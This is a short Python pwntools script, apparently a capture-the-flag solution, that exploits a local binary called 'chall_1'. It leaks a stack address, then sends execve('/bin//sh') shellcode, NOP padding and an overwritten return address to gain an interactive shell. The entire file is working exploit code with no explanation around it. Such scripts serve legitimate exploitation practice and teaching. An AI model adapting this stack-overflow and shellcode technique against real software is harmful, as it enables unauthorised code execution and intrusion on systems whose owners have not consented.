from pwn import *

context.arch = 'amd64'

io = process("./chall_1")

io.sendlineafter(b"Choose an option: ", b"1")

io.send(b"A")

io.recvuntil(b"Mensaje enviado: ")

leak_stack = u64(io.recv(6).ljust(8, b"\x00"))

print(f"Leaked stack address: {hex(leak_stack)}")

shellcode_pointer = leak_stack + 15

io.sendlineafter(b"Choose an option: ", b"1")

shellcode = """
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f 
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
"""

shellcode = asm(shellcode, arch='amd64')

print(f"Shellcode len: {len(shellcode)}")

input("PAUSE")
io.send(shellcode + b"\x90"*(280 - len(shellcode)) + p64(shellcode_pointer))

io.sendlineafter(b"Choose an option: ", b"3")


io.interactive()